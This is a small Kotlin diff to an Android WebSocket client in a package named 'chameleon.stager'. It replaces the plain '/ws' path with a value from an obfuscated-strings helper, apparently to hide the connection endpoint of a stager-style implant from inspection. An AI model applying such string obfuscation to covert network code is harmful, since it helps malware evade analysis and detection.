@@ -1,6 +1,7 @@
 package com.chameleon.stager.service
 
 import android.util.Log
+import com.chameleon.stager.utils.ObfuscatedStrings
 import java.io.BufferedReader
 import java.io.InputStreamReader
 import java.io.OutputStreamWriter
@@ -37,7 +38,7 @@ class WebSocketClient(private val url: String) {
             val portStr = url.substringAfter(":").substringAfter("//")
                 .substringBefore("/").substringAfter(":", "")
             val port = portStr.toIntOrNull() ?: if (isTls) 443 else 80
-            val path = "/ws"
+            val path = ObfuscatedStrings.wsPath
 
             socket = if (isTls) {
                 createTlsSocket(host, port)
